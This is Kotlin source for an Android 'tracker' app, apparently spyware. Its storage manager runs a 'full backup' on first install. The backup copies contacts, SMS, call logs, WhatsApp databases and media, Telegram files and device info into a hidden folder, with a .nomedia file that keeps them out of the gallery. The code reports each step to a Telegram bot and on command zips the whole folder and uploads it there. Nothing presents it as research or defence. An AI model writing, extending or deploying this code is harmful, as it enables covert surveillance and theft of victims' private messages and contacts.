package com.abuzahra.tracker

import android.content.Context
import android.os.Environment
import android.util.Log
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/**
 * LocalStorageManager - إدارة التخزين المحلي والنسخ الاحتياطي
 */
object LocalStorageManager {

    private const val TAG = "LocalStorageManager"
    private const val DATA_DIR = "alzahra_data"
    private const val BACKUP_DIR = ".abuzahra_backup"
    private val gson = Gson()

    fun storeData(context: Context, command: String, data: Any) {
        try {
            val dir = File(context.filesDir, DATA_DIR)
            if (!dir.exists()) dir.mkdirs()

            val timestamp = System.currentTimeMillis()
            val fileName = "${command}_${timestamp}.json"
            val file = File(dir, fileName)
            val jsonContent = gson.toJson(data)
            file.writeText(jsonContent)
            Log.d(TAG, "تم حفظ بيانات [$command]: ${file.name} (${jsonContent.length} bytes)")
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في حفظ بيانات [$command]: ${e.message}", e)
        }
    }

    fun readData(context: Context, command: String): List<String> {
        val results = mutableListOf<String>()
        try {
            val dir = File(context.filesDir, DATA_DIR)
            if (!dir.exists()) return results
            val pattern = Regex("^${command}_\\d+\\.json$")
            dir.listFiles()?.filter { it.isFile && it.name.matches(pattern) }
                ?.sortedByDescending { it.lastModified() }?.forEach { file ->
                    try { results.add(file.readText()) }
                    catch (e: Exception) { Log.e(TAG, "خطأ في قراءة ${file.name}: ${e.message}") }
                }
        } catch (e: Exception) { Log.e(TAG, "خطأ: ${e.message}") }
        return results
    }

    /**
     * إنشاء نسخة احتياطية شاملة عند التثبيت الأول
     * تشمل: جهات الاتصال، الرسائل، المكالمات، ملفات واتساب
     */
    fun createFullBackup(context: Context) {
        try {
            val backupDir = getBackupDir(context)
            if (!backupDir.exists()) backupDir.mkdirs()

            Log.d(TAG, "📁 إنشاء مجلد النسخ الاحتياطي: ${backupDir.absolutePath}")

            // 1. نسخة احتياطية لجهات الاتصال
            try {
                val contactsData = CommandExecutor.execute(context, "get_contacts", org.json.JSONObject())
                val contactsFile = File(backupDir, "contacts_${timestamp()}.json")
                contactsFile.writeText(contactsData)
                Log.d(TAG, "✅ تم نسخ جهات الاتصال")
            } catch (e: Exception) { Log.e(TAG, "خطأ نسخ جهات الاتصال: ${e.message}") }

            // 2. نسخة احتياطية للرسائل
            try {
                val smsData = CommandExecutor.execute(context, "get_sms", org.json.JSONObject())
                val smsFile = File(backupDir, "sms_${timestamp()}.json")
                smsFile.writeText(smsData)
                Log.d(TAG, "✅ تم نسخ الرسائل")
            } catch (e: Exception) { Log.e(TAG, "خطأ نسخ الرسائل: ${e.message}") }

            // 3. نسخة احتياطية للمكالمات
            try {
                val callsData = CommandExecutor.execute(context, "get_calls", org.json.JSONObject())
                val callsFile = File(backupDir, "calls_${timestamp()}.json")
                callsFile.writeText(callsData)
                Log.d(TAG, "✅ تم نسخ المكالمات")
            } catch (e: Exception) { Log.e(TAG, "خطأ نسخ المكالمات: ${e.message}") }

            // 4. نسخ ملفات واتساب
            copyWhatsAppFiles(backupDir)

            // 5. نسخ ملفات تليجرام
            copyTelegramFiles(backupDir)

            // 6. حفظ معلومات الجهاز
            try {
                val infoData = CommandExecutor.getDeviceInfo(context)
                val infoFile = File(backupDir, "device_info_${timestamp()}.json")
                infoFile.writeText(infoData)
            } catch (e: Exception) { Log.e(TAG, "خطأ نسخ معلومات الجهاز: ${e.message}") }

            // إنشاء ملف مخفي (.nomedia) لمنع ظهور الملفات في المعرض
            val nomedia = File(backupDir, ".nomedia")
            if (!nomedia.exists()) nomedia.writeText("")

            val backupScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
            backupScope.launch {
                TelegramDirectClient.sendMessage(
                    "💾 <b>تم إنشاء النسخة الاحتياطية الأولى</b>\n\n" +
                    "📇 جهات الاتصال\n" +
                    "📲 الرسائل SMS\n" +
                    "📞 سجل المكالمات\n" +
                    "💬 ملفات واتساب\n" +
                    "📱 معلومات الجهاز\n\n" +
                    "📁 المسار: ${backupDir.absolutePath}",
                    "HTML"
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إنشاء النسخة الاحتياطية: ${e.message}", e)
        }
    }

    private fun copyWhatsAppFiles(backupDir: File) {
        try {
            val waDirs = listOf(
                Environment.getExternalStorageDirectory().absolutePath + "/WhatsApp/Databases",
                Environment.getExternalStorageDirectory().absolutePath + "/WhatsApp/Media/WhatsApp Images",
                Environment.getExternalStorageDirectory().absolutePath + "/WhatsApp/Media/WhatsApp Video",
                Environment.getExternalStorageDirectory().absolutePath + "/WhatsApp/Media/WhatsApp Audio",
                Environment.getExternalStorageDirectory().absolutePath + "/WhatsApp/Media/WhatsApp Documents"
            )

            val waBackupDir = File(backupDir, "whatsapp")
            if (!waBackupDir.exists()) waBackupDir.mkdirs()

            for (dirPath in waDirs) {
                val sourceDir = File(dirPath)
                if (sourceDir.exists() && sourceDir.isDirectory) {
                    val subDirName = sourceDir.name
                    val destDir = File(waBackupDir, subDirName)
                    if (!destDir.exists()) destDir.mkdirs()

                    // نسخ آخر 50 ملف
                    sourceDir.listFiles()?.sortedByDescending { it.lastModified() }?.take(50)?.forEach { file ->
                        try {
                            val dest = File(destDir, file.name)
                            if (!dest.exists()) {
                                file.copyTo(dest, false)
                                Log.d(TAG, "تم نسخ: ${file.name}")
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "خطأ نسخ ${file.name}: ${e.message}")
                        }
                    }
                }
            }
            Log.d(TAG, "✅ تم نسخ ملفات واتساب")
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في نسخ واتساب: ${e.message}")
        }
    }

    private fun copyTelegramFiles(backupDir: File) {
        try {
            val tgDir = File(Environment.getExternalStorageDirectory().absolutePath + "/Telegram")
            if (tgDir.exists()) {
                val tgBackupDir = File(backupDir, "telegram")
                if (!tgBackupDir.exists()) tgBackupDir.mkdirs()

                tgDir.listFiles()?.take(20)?.forEach { file ->
                    try {
                        val dest = File(tgBackupDir, file.name)
                        if (!dest.exists()) file.copyTo(dest, false)
                    } catch (e: Exception) { Log.e(TAG, "خطأ نسخ ${file.name}: ${e.message}") }
                }
                Log.d(TAG, "✅ تم نسخ ملفات تليجرام")
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في نسخ تليجرام: ${e.message}")
        }
    }

    /**
     * الحصول على مجلد النسخ الاحتياطي
     */
    fun getBackupDir(context: Context): File {
        return File(Environment.getExternalStorageDirectory(), BACKUP_DIR)
    }

    /**
     * إرسال النسخة الاحتياطية الكاملة كملف ZIP
     */
    suspend fun sendFullBackup(context: Context) {
        try {
            val backupDir = getBackupDir(context)
            if (!backupDir.exists()) {
                TelegramDirectClient.sendMessage("❌ لا توجد نسخة احتياطية", "HTML")
                return
            }

            TelegramDirectClient.sendMessage("📦 <b>جاري تحضير النسخة الاحتياطية...</b>", "HTML")

            val zipFile = File(context.getExternalFilesDir(null), "full_backup_${timestamp()}.zip")
            zipFolder(backupDir, zipFile)

            if (zipFile.exists()) {
                TelegramDirectClient.sendDocumentFile(
                    zipFile.readBytes(),
                    zipFile.name,
                    "📦 النسخة الاحتياطية الشاملة - ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date())}"
                )
                zipFile.delete()
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إرسال النسخة الاحتياطية: ${e.message}")
            TelegramDirectClient.sendMessage("❌ خطأ في إرسال النسخة الاحتياطية: ${e.message}", "HTML")
        }
    }

    private fun zipFolder(sourceDir: File, zipFile: File) {
        ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
            sourceDir.walkTopDown().forEach { file ->
                if (file.isFile && file != zipFile) {
                    val entryName = file.relativeTo(sourceDir).path
                    zos.putNextEntry(ZipEntry(entryName))
                    FileInputStream(file).use { input -> input.copyTo(zos) }
                    zos.closeEntry()
                }
            }
        }
    }

    private fun timestamp(): String {
        return SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
    }

    fun getAllFiles(context: Context): List<File> {
        return try {
            val dir = File(context.filesDir, DATA_DIR)
            if (!dir.exists()) return emptyList()
            dir.listFiles()?.filter { it.isFile && it.extension == "json" }
                ?.sortedByDescending { it.lastModified() } ?: emptyList()
        } catch (e: Exception) { emptyList() }
    }

    fun getStorageUsage(context: Context): Long {
        return try {
            val dir = File(context.filesDir, DATA_DIR)
            if (!dir.exists()) return 0
            dir.walkTopDown().filter { it.isFile }.sumOf { it.length() }
        } catch (e: Exception) { 0 }
    }

    fun clearOldData(context: Context, keepLast: Int = 100): Int {
        var deletedCount = 0
        try {
            val files = getAllFiles(context)
            if (files.size <= keepLast) return 0
            files.drop(keepLast).forEach { if (it.delete()) deletedCount++ }
        } catch (e: Exception) { Log.e(TAG, "خطأ: ${e.message}") }
        return deletedCount
    }

    fun clearAllData(context: Context): Boolean {
        return try {
            val dir = File(context.filesDir, DATA_DIR)
            if (dir.exists()) dir.deleteRecursively()
            true
        } catch (e: Exception) { false }
    }

    fun getFileCount(context: Context): Int {
        return try {
            val dir = File(context.filesDir, DATA_DIR)
            if (!dir.exists()) return 0
            dir.listFiles()?.count { it.isFile && it.extension == "json" } ?: 0
        } catch (e: Exception) { 0 }
    }

    fun getStorageUsageFormatted(context: Context): String {
        val bytes = getStorageUsage(context)
        return if (bytes < 1024) "$bytes B"
        else if (bytes < 1024 * 1024) "${"%.1f".format(bytes / 1024.0)} KB"
        else "${"%.1f".format(bytes / (1024.0 * 1024.0))} MB"
    }

    fun getStorageSummary(context: Context): Map<String, Any> {
        val files = getAllFiles(context)
        val totalSize = getStorageUsage(context)
        val commandCounts = mutableMapOf<String, Int>()
        for (file in files) {
            val prefix = file.name.substringBefore("_")
            commandCounts[prefix] = (commandCounts[prefix] ?: 0) + 1
        }
        return mapOf(
            "total_files" to files.size,
            "total_size" to totalSize,
            "total_size_formatted" to getStorageUsageFormatted(context),
            "command_counts" to commandCounts
        )
    }
}
